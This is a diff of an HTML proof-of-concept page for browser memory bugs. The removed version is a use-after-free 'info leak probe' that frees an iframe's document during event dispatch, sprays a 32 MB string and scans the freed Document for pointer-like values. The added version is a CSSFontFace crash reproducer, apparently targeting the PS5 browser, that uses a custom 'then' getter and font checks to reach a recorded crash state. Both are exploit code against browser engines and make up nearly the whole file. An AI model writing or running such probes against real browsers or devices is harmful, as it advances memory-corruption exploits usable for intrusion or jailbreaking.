@@ -1,110 +1,170 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
-<head><meta charset="utf-8"><title>EventTarget Info Leak Probe</title></head>
+<head>
+<meta charset="utf-8">
+<title>CSSFontFace quiet PS5 diagnostic</title>
+<style>
+@font-face {
+  font-family: "fface-quiet-ps5";
+  src: local("DejaVuSans"), local("DejaVu Sans"), local("Arial"), local("Helvetica"), local("Times New Roman"), local("Courier New");
+  unicode-range: U+0042;
+}
+#probe {
+  font-family: "fface-quiet-ps5";
+  position: absolute;
+  left: -10000px;
+  top: -10000px;
+}
+</style>
+</head>
 <body>
-<p><button onclick="go()">Click to run leak probe</button></p>
-<div id="out" style="font-family:monospace;white-space:pre;color:#0f0;background:#000;"></div>
+<span id="probe">B</span>
+<pre id="result">running</pre>
 <script>
-'use strict';
+(function () {
+    "use strict";
 
-// ---------- Logging ----------
-const out = document.getElementById('out');
-function log(m, c) {
-    console.log(m);
-    const s = document.createElement('span');
-    if (c) s.style.color = c;
-    s.textContent = m + '\n';
-    out.appendChild(s);
-}
-
-// ---------- Suspicious value detector ----------
-function isSuspicious(val) {
-    const s = String(val);
-    // Hex pointer pattern
-    if (/\b0x[0-9a-f]{6,16}\b/i.test(s)) return true;
-    // Long decimal numbers
-    if (/^\d{10,}$/.test(s)) return true;
-    // High entropy garbage strings
-    if (s.length > 50 && s.replace(/[A-Za-z0-9]/g,'').length > 10) return true;
-    return false;
-}
-
-function go() {
-    log('=== EventTarget UAF Info Leak Probe ===', '#fff');
-
-    // Step 1: Create iframe and event setup
-    const f = document.body.appendChild(document.createElement('iframe'));
-    const a = document.createElement('div');
-    const b = a.appendChild(document.createElement('div'));
-
-    // Listener 1: remove iframe + throw string spray
-    a.addEventListener('x', function() {
-        log('Listener 1: removing iframe & spraying...');
-        document.adoptNode(a);
-        f.remove();   // Document may become unreachable
-
-        // Throw with a 32 MB string spray of 'B' characters
-        throw {
-            line: 1, column: 1,
-            sourceURL: 'B'.repeat(1024 * 1024 * 32)
-        };
-    });
-
-    // Listener 2: no-op
-    a.addEventListener('x', () => {});
-
-    // Listener 3: attempt to read freed Document WITHOUT saving a reference
-    b.addEventListener('x', function() {
-        log('Listener 3: accessing f.contentDocument...');
-        try {
-            // Try to get document without locking a JS ref
-            const doc = f.contentDocument;
-            if (!doc) {
-                log('  f.contentDocument is null', '#f00');
-                return;
-            }
-            log('  Document still reachable, reading all properties...');
-
-            // List of common Document properties
-            const props = [
-                'URL', 'documentURI', 'title', 'characterSet', 'contentType',
-                'readyState', 'designMode', 'compatMode', 'hidden', 'visibilityState',
-                'cookie', 'lastModified', 'location', 'referrer', 'activeElement',
-                'body', 'head', 'images', 'links', 'forms', 'scripts',
-                'styleSheets', 'all', 'children', 'childElementCount', 'firstElementChild',
-                'lastElementChild', 'rootElement', 'scrollingElement', 'documentElement',
-                'domain', 'inputEncoding', 'xmlEncoding', 'xmlVersion', 'xmlStandalone',
-                'anchors', 'applets', 'embeds', 'plugins', 'baseURI', 'origin',
-                'defaultView', 'ownerDocument', 'parentElement'
-            ];
-            for (const p of props) {
-                try {
-                    const v = doc[p];
-                    const str = String(v);
-                    if (isSuspicious(str)) {
-                        log(`  ★ LEAK? ${p} = ${str}`, '#ff0');
-                    } else {
-                        log(`    ${p} = ${str}`);
-                    }
-                } catch(e) {
-                    log(`    ${p} = ERROR: ${e.message}`);
-                }
-            }
-            log('  Property scan done.');
-        } catch(e) {
-            log('  Exception in listener 3: ' + e.message, '#f00');
-        }
-    });
-
-    log('Dispatching event...');
-    // The dispatch will throw, but the third listener should still execute.
-    try {
-        b.dispatchEvent(new Event('x', { bubbles: true }));
-    } catch(e) {
-        log('Main: caught throw (expected)');
+    if (window.testRunner) {
+        testRunner.dumpAsText();
+        testRunner.waitUntilDone();
     }
-    log('=== Probe finished ===', '#fff');
-}
+
+    const storageKey = "fface-quiet-checkpoint";
+    const resultLines = [];
+    let finished = false;
+    let getterHits = 0;
+
+    function hardMark(message)
+    {
+        try {
+            localStorage.setItem(storageKey, "[" + Date.now() + "] " + message);
+        } catch (e) {
+        }
+    }
+
+    function record(message)
+    {
+        resultLines.push(message);
+        try {
+            console.log(message);
+        } catch (e) {
+        }
+    }
+
+    function finish()
+    {
+        if (finished)
+            return;
+        finished = true;
+        try {
+            document.getElementById("result").textContent = resultLines.join("\n");
+        } catch (e) {
+        }
+        if (window.testRunner)
+            testRunner.notifyDone();
+    }
+
+    function fail(message)
+    {
+        record(message);
+        record("DONE");
+        setTimeout(finish, 0);
+    }
+
+    function makeThenGetter()
+    {
+        return function () {
+            ++getterHits;
+            hardMark("quiet then getter read");
+            return undefined;
+        };
+    }
+
+    function run()
+    {
+        hardMark("quiet run start");
+        record("POC STARTED: CSSFontFace quiet PS5 diagnostic");
+
+        if (!window.FontFace)
+            return fail("FontFace API missing");
+        if (!document.fonts)
+            return fail("document.fonts missing");
+
+        const family = "fface-quiet-ps5";
+        hardMark("css font-face present");
+
+        hardMark("before js FontFace create");
+        const jsFace = new FontFace(
+            family,
+            'local("DejaVuSans"), local("DejaVu Sans"), local("Arial"), local("Helvetica"), local("Times New Roman"), local("Courier New")',
+            { unicodeRange: "U+0041" }
+        );
+        hardMark("after js FontFace create");
+
+        hardMark("before define own then getter");
+        Object.defineProperty(jsFace, "then", {
+            configurable: true,
+            get: makeThenGetter()
+        });
+        hardMark("after define own then getter");
+
+        hardMark("before jsFace.loaded access");
+        const loadedPromise = jsFace.loaded;
+        hardMark("after jsFace.loaded access");
+        if (loadedPromise) {
+            loadedPromise.then(function () {
+                hardMark("jsFace.loaded resolved");
+            }, function () {
+                hardMark("jsFace.loaded rejected");
+            });
+        }
+
+        hardMark("before document.fonts.add");
+        document.fonts.add(jsFace);
+        hardMark("after document.fonts.add");
+
+        hardMark("before document.fonts.check A");
+        const checkA = document.fonts.check('16px "' + family + '"', "A");
+        hardMark("after document.fonts.check A");
+
+        hardMark("before document.fonts.check B");
+        const checkB = document.fonts.check('16px "' + family + '"', "B");
+        hardMark("after document.fonts.check B");
+
+        hardMark("before document.fonts.check AB");
+        const checkAB = document.fonts.check('16px "' + family + '"', "AB");
+        hardMark("after document.fonts.check AB");
+
+        record("document.fonts.check A=" + checkA + " B=" + checkB + " AB=" + checkAB);
+        record("then getter hits=" + getterHits);
+
+        if (checkA === false && checkB === true && checkAB === false) {
+            hardMark("MATCHED ORIGINAL CRASH STATE");
+            record("MATCHED ORIGINAL CRASH STATE A=false B=true AB=false");
+
+            hardMark("before body.offsetTop");
+            record("before body.offsetTop");
+            const offset = document.body.offsetTop;
+            hardMark("after body.offsetTop");
+            record("after body.offsetTop value=" + offset);
+        } else
+            record("CHECK STATE DIFFERENT A=" + checkA + " B=" + checkB + " AB=" + checkAB);
+
+        record("NO CRASH OBSERVED");
+        record("DONE");
+        setTimeout(finish, 0);
+    }
+
+    window.onerror = function (message, source, line, column)
+    {
+        hardMark("window.onerror");
+        record("window.onerror: " + message + " at " + line + ":" + column);
+        record("DONE");
+        setTimeout(finish, 0);
+    };
+
+    setTimeout(run, 0);
+})();
 </script>
 </body>
 </html>
